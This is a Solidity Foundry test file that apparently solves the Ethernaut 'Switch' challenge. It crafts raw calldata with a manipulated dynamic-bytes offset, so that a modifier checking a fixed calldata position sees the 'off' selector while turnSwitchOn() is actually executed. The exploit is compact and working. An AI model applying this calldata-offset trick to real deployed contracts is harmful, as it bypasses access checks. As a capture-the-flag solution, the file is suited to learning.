// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Switch} from "src/Switch/Switch.sol";

contract SwitchTest is Test {
    // Calldata to trick switch
    // 0x30c13ade (flipSwitch(bytes))
    // 0x
    function testSwitch() public {
        Switch s = Switch(0x1360fB26ff397aE65717C830305eC914dFC534b7);
        bytes4 flipSwitchSelector = bytes4(keccak256("flipSwitch(bytes)"));
        bytes32 offset = bytes32(bytes1(0x60)) >> 248;
        bytes32 padding = 0x00;
        bytes32 offSelector = bytes32(s.offSelector());
        bytes32 dataLength = bytes32(bytes1(0x04)) >> 248;
        bytes32 onSelector = bytes32(bytes4(keccak256("turnSwitchOn()")));
        bytes memory data = abi.encodePacked(
            flipSwitchSelector,
            offset,
            padding,
            offSelector,
            dataLength,
            onSelector
        );
        console.logBytes(data);

        (bool success, ) = address(s).call(data);
        require(success && s.switchOn(), "Switch not on");
    }
}
